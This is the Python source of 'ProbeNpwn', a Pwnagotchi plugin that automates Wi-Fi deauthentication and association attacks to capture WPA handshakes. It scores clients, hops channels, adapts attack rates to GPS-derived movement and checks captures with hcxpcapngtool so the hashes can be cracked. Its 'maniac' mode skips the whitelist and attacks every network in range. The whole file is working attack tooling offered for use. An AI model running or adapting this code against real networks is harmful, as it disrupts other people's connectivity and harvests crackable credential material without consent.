import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
from concurrent.futures import ThreadPoolExecutor
from queue import PriorityQueue
import multiprocessing  # For cpu_count
import math  # For haversine distance
import re  # For parsing hcx output
import tempfile  # For temporary files

class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.4.0'  # Updated to extend profiles with more adjustments (e.g., throttle delays)
    __license__ = 'GPL3'
    __description__ = (
        'Aggressively capture handshakes with two modes: Tactical (smart and efficient) and Maniac '
        '(unrestricted, rapid attacks). Enhanced with client scoring, adaptive attacks, ML-based '
        'channel hopping, intelligent retries, resource management, and dynamic adjustment of '
        'autotune/personality params based on detected environment (stationary, walking, driving). '
        'Updated handshake validation using hcxpcapngtool for reliability. Now integrates with '
        'Bettercap GPS data (if available) for speed estimation in environment detection. Extended '
        'profiles to adjust more parameters like throttle delays for better crash prevention.'
    )

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self.old_name = None
        self.recents = {}
        self.executor = None
        self._watchdog_thread = None
        self._watchdog_thread_running = True
        self.attack_attempts = {}
        self.success_counts = {}
        self.total_handshakes = 0
        self.failed_handshakes = 0
        self.performance_stats = {}
        self.whitelist = set()
        self.cooldowns = {}
        self.epoch_duration = 60
        self.ap_clients = {}
        self.channel_activity = {}
        self.client_scores = {}
        self.ap_client_groups = {}
        self.mode = "tactical"
        self.retry_queue = PriorityQueue(maxsize=100)
        self.handshake_db = set()
        self.attacks_x = 10
        self.attacks_y = 20
        self.success_x = 10
        self.success_y = 30
        self.handshakes_x = 10
        self.handshakes_y = 40
        self.ui_initialized = False
        self.last_ui_update = 0
        self.ui_update_interval = 5
        # Environment detection
        self.environment = "stationary"  # Default
        self.new_aps_per_epoch = 0
        self.epoch_count = 0
        self.env_check_interval = 5  # Check every 5 epochs
        self.prev_gps = None  # For speed estimation: {'Latitude': float, 'Longitude': float}
        self.prev_time = None
        # Extended param profiles for environments (added throttle_a, throttle_d)
        self.env_profiles = {
            "stationary": {
                "recon_time": 30,  # Longer scan
                "min_recon_time": 10,
                "ap_ttl": 300,  # Longer TTL
                "sta_ttl": 300,
                "deauth_prob": 0.8,  # More aggressive
                "assoc_prob": 0.8,
                "min_rssi": -80,  # Attack weaker signals
                "throttle_a": 0.1,  # Low delay for stable environment
                "throttle_d": 0.1   # Low delay
            },
            "walking": {
                "recon_time": 15,  # Medium
                "min_recon_time": 5,
                "ap_ttl": 120,  # Shorter TTL
                "sta_ttl": 120,
                "deauth_prob": 0.6,
                "assoc_prob": 0.6,
                "min_rssi": -70,
                "throttle_a": 0.15,  # Moderate delay
                "throttle_d": 0.15
            },
            "driving": {
                "recon_time": 5,  # Quick scans
                "min_recon_time": 2,
                "ap_ttl": 30,  # Very short TTL
                "sta_ttl": 30,
                "deauth_prob": 0.4,  # Less aggressive to avoid crashes
                "assoc_prob": 0.4,
                "min_rssi": -60,  # Only strong signals
                "throttle_a": 0.2,  # Higher delay to reduce nexmon crashes during rapid movement
                "throttle_d": 0.2
            }
        }

    ### Lifecycle Methods

    def on_loaded(self):
        logging.info("Plugin ProbeNpwn loaded")
        self.executor = ThreadPoolExecutor(max_workers=self.get_dynamic_max_workers())

    def on_config_changed(self, config):
        self.whitelist = set(config["main"].get("whitelist", []))
        self.verbose = config.get("main", {}).get("plugins", {}).get("probenpwn", {}).get("verbose", False)
        logging.getLogger().setLevel(logging.INFO if self.verbose else logging.WARNING)
        self.old_name = config.get("main").get("name", "")
        self.mode = config["main"]["plugins"]["probenpwn"].get("mode", "tactical")
        self.attacks_x = config["main"]["plugins"]["probenpwn"].get("attacks_x_coord", 10)
        self.attacks_y = config["main"]["plugins"]["probenpwn"].get("attacks_y_coord", 20)
        self.success_x = config["main"]["plugins"]["probenpwn"].get("success_x_coord", 10)
        self.success_y = config["main"]["plugins"]["probenpwn"].get("success_y_coord", 30)
        self.handshakes_x = config["main"]["plugins"]["probenpwn"].get("handshakes_x_coord", 10)
        self.handshakes_y = config["main"]["plugins"]["probenpwn"].get("handshakes_y_coord", 40)
        # Optional: Override with env-based if not set
        self.apply_env_adjustments(config)

    def on_unload(self, ui):
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")
            ui.remove_element('attacks')
            ui.remove_element('success')
            ui.remove_element('handshakes')
            ui.remove_element('environment')  # New UI element
        self._watchdog_thread_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join()
        self.executor.shutdown(wait=True)
        logging.info("Probing out.")

    ### UI Methods

    def on_ui_setup(self, ui):
        if not self.ui_initialized:
            ui.add_element('attacks', components.Text(position=(self.attacks_x, self.attacks_y), value='Attacks: 0', color=255))
            ui.add_element('success', components.Text(position=(self.success_x, self.success_y), value='Success: 0.0%', color=255))
            ui.add_element('handshakes', components.Text(position=(self.handshakes_x, self.handshakes_y), value='Handshakes: 0', color=255))
            ui.add_element('environment', components.Text(position=(self.handshakes_x, self.handshakes_y + 10), value='Env: Stationary', color=255))
            self.ui_initialized = True

    def on_ui_update(self, ui):
        current_time = time.time()
        if current_time - self.last_ui_update < self.ui_update_interval:
            return
        self.last_ui_update = current_time
        total_attempts = sum(self.attack_attempts.values())
        total_successes = sum(self.success_counts.values())
        success_rate = (total_successes / total_attempts) * 100 if total_attempts > 0 else 0.0
        with ui._lock:
            ui.set('attacks', f"Attacks: {total_attempts}")
            ui.set('success', f"Success: {success_rate:.1f}%")
            ui.set('handshakes', f"Handshakes: {self.total_handshakes}")
            ui.set('environment', f"Env: {self.environment.capitalize()}")

    ### Core Functionality

    def on_ready(self, agent):
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, args=(agent,), daemon=True)
        self._watchdog_thread.start()
        with agent._view._lock:
            agent._view.set("status", "Probe engaged..." if self.mode == "tactical" else "Maniac mode activated!")

    def _watchdog(self, agent):
        CHECK_INTERVAL = 10
        MAX_RETRIES = 1
        retry_count = 0
        while self._watchdog_thread_running:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon missing! Attempting recovery...")
                try:
                    subprocess.run(["ip", "link", "set", "wlan0mon", "down"], check=True, capture_output=True)
                    subprocess.run(["ip", "link", "set", "wlan0mon", "up"], check=True, capture_output=True)
                    retry_count = 0
                except Exception as e:
                    logging.error(f"Recovery failed: {e}")
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        try:
                            subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True, capture_output=True)
                        except Exception as e:
                            logging.error(f"Restart failed: {e}")
                        break
            else:
                retry_count = 0
                agent.set_channel(self.select_channel())
            time.sleep(CHECK_INTERVAL)

    def select_channel(self):
        if not self.channel_activity:
            return random.randint(1, 11)
        weights = {ch: max(1, stats["aps"] + stats["clients"]) * self.success_counts.get(str(ch), 1) for ch, stats in self.channel_activity.items()}
        total_weight = sum(weights.values())
        if total_weight == 0:
            return random.randint(1, 11)
        pick = random.random() * total_weight
        current = 0
        for channel, weight in weights.items():
            current += weight
            if current >= pick:
                return channel
        return next(iter(self.channel_activity))

    def track_recent(self, ap, cl=None):
        current_time = time.time()
        ap['_track_time'] = current_time
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = current_time
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, agent, ap):
        if self.mode == "maniac":
            return True
        ap_mac_lower = ap['mac'].lower()
        ap_hostname_lower = ap.get('hostname', '').lower()
        return ap_hostname_lower not in self.whitelist and ap_mac_lower not in self.whitelist

    def attack_target(self, agent, ap, cl, retry_count=0):
        ap_mac = ap['mac'].lower()
        if self.mode == "tactical":
            if ap_mac in self.cooldowns and time.time() < self.cooldowns[ap_mac]:
                return
            if cl and self.client_scores.get(cl['mac'].lower(), 0) < 50:
                return
        elif self.mode == "maniac" and self.attack_attempts.get(ap_mac, 0) > 50:
            return

        if not self.ok_to_attack(agent, ap):
            return

        agent.set_channel(ap['channel'])
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.info(f"Attacking AP {ap_mac} (client: {cl['mac'] if cl else 'N/A'})")

        if agent._config['personality']['deauth']:
            if ap_mac in self.ap_client_groups:
                for cl_mac in self.ap_client_groups[ap_mac][:5]:
                    client_data = self.recents.get(cl_mac)
                    if client_data:
                        self.executor.submit(agent.deauth, ap, client_data, self.dynamic_attack_delay(ap, client_data))
            elif cl:
                self.executor.submit(agent.deauth, ap, cl, self.dynamic_attack_delay(ap, cl))

        if random.random() < 0.2:
            self.executor.submit(agent.associate, ap, 0.05)

    def dynamic_attack_delay(self, ap, cl):
        if self.mode == "maniac":
            return 0.05
        signal = cl.get('signal', -100)
        base_delay = 0.1 if signal >= -60 else 0.2
        ap_mac = ap['mac'].lower()
        attempts = self.attack_attempts.get(ap_mac, 0)
        if attempts > 5:
            base_delay *= 0.4
        num_clients = self.ap_clients.get(ap_mac, 0)
        if num_clients > 3:
            base_delay *= 0.8
        return base_delay * (0.95 + random.random() * 0.1)

    def get_dynamic_max_workers(self):
        try:
            load_avg = os.getloadavg()[0]
            cpu_count = multiprocessing.cpu_count()
            base_workers = cpu_count * 5
            if load_avg > cpu_count * 0.8:
                return max(10, int(base_workers * 0.5))
            elif load_avg > cpu_count * 0.5:
                return int(base_workers * 0.75)
            return base_workers
        except Exception:
            return 20

    def detect_environment(self, agent):
        gps = agent.session().get('gps', None)
        current_time = time.time()
        speed = 0.0  # Default
        if gps and 'Latitude' in gps and gps['Latitude'] != 0 and 'Longitude' in gps and gps['Longitude'] != 0:
            current_gps = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
            if self.prev_gps and self.prev_time:
                # Haversine distance (km)
                lat1, lon1 = math.radians(self.prev_gps['Latitude']), math.radians(self.prev_gps['Longitude'])
                lat2, lon2 = math.radians(current_gps['Latitude']), math.radians(current_gps['Longitude'])
                dlat, dlon = lat2 - lat1, lon2 - lon1
                a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
                c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
                distance = 6371 * c  # Earth radius in km
                time_delta = max(1, current_time - self.prev_time)  # Seconds, avoid div by zero
                speed = (distance / time_delta) * 3600  # km/h
            self.prev_gps = current_gps
            self.prev_time = current_time
        if speed > 10:
            return "driving"
        elif speed > 1:
            return "walking"
        elif speed == 0 and gps:  # Valid GPS but no movement
            return "stationary"
        # Fallback to AP rate if no valid GPS or zero speed
        ap_rate = self.new_aps_per_epoch / max(1, self.epoch_count % self.env_check_interval)
        if ap_rate > 20:
            return "driving"
        elif ap_rate > 5:
            return "walking"
        else:
            return "stationary"

    def apply_env_adjustments(self, config):
        profile = self.env_profiles.get(self.environment, self.env_profiles["stationary"])
        for param, value in profile.items():
            if param in config['personality']:
                config['personality'][param] = value
        logging.info(f"Applied {self.environment} profile to personality params.")

    ### Event Handlers

    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event['data']
        ap_mac = ap['mac'].lower()
        channel = ap['channel']
        self.channel_activity.setdefault(channel, {"aps": 0, "clients": 0})
        self.channel_activity[channel]["aps"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0)
        self.new_aps_per_epoch += 1  # Track for env detection
        if self.ok_to_attack(agent, ap):
            self.executor.submit(self.attack_target, agent, ap, None)

    def on_bcap_wifi_client_new(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        channel = ap['channel']
        self.channel_activity.setdefault(channel, {"aps": 0, "clients": 0})
        self.channel_activity[channel]["clients"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients[ap_mac] / 10)
        existing_score = self.client_scores.get(cl_mac, 0)
        self.client_scores[cl_mac] = max(0, existing_score * 0.95) + (signal + 100) * activity
        self.ap_client_groups.setdefault(ap_mac, []).append(cl_mac)
        if self.ok_to_attack(agent, ap):
            self.executor.submit(self.attack_target, agent, ap, cl)

    def is_handshake_valid(self, filename):
        """Validate handshake using hcxpcapngtool by converting to .hc22000 and checking output."""
        try:
            with tempfile.NamedTemporaryFile(suffix='.hc22000', delete=True) as temp_f:
                result = subprocess.run(['hcxpcapngtool', '-o', temp_f.name, filename], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    match = re.search(r'wrote (\d+) hash\(es\)', result.stdout)
                    if match and int(match.group(1)) > 0:
                        return True
        except Exception as e:
            logging.error(f"Handshake validation with hcx failed: {e}")
        return False

    def on_handshake(self, agent, filename, ap, cl):
        try:
            with open(filename, 'rb') as f:
                file_snippet = f.read(10)
        except Exception:
            file_snippet = b''
        handshake_hash = hash(f"{ap['mac']}{cl.get('mac', '')}{filename}{file_snippet}")
        if handshake_hash in self.handshake_db:
            logging.info(f"Duplicate handshake for {ap['mac']}. Skipping.")
            return
        if not self.is_handshake_valid(filename):
            logging.info(f"Invalid handshake for {ap['mac']}. Scheduling retry...")
            self.failed_handshakes += 1
            delay = min(60, 1 * (2 ** min(self.attack_attempts.get(ap['mac'].lower(), 0), 5)))
            if not self.retry_queue.full():
                self.retry_queue.put((time.time() + delay, (agent, ap, cl, self.attack_attempts.get(ap['mac'].lower(), 0) + 1)))
            return

        ap_mac = ap['mac'].lower()
        self.handshake_db.add(handshake_hash)
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.total_handshakes += 1
        if self.mode == "tactical":
            self.cooldowns[ap_mac] = time.time() + 60

    def on_epoch(self, agent, epoch, epoch_data):
        current_time = time.time()
        while not self.retry_queue.empty() and self.retry_queue.queue[0][0] <= current_time:
            _, (agent, ap, cl, retry_count) = self.retry_queue.get()
            self.executor.submit(self.attack_target, agent, ap, cl, retry_count)
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (current_time - self.epoch_duration):
                del self.recents[mac]
        for ap_mac in list(self.ap_client_groups):
            if ap_mac not in self.recents:
                del self.ap_client_groups[ap_mac]
        # Environment check
        self.epoch_count += 1
        if self.epoch_count % self.env_check_interval == 0:
            new_env = self.detect_environment(agent)
            if new_env != self.environment:
                self.environment = new_env
                self.apply_env_adjustments(agent._config)
                logging.info(f"Environment changed to {new_env}")
            self.new_aps_per_epoch = 0  # Reset counter

    def on_bcap_wifi_ap_updated(self, agent, event):
        ap = event['data']
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)

    def on_bcap_wifi_client_updated(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients[ap_mac] / 10)
        existing_score = self.client_scores.get(cl_mac, 0)
        self.client_scores[cl_mac] = max(0, existing_score * 0.95) + (signal + 100) * activity
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
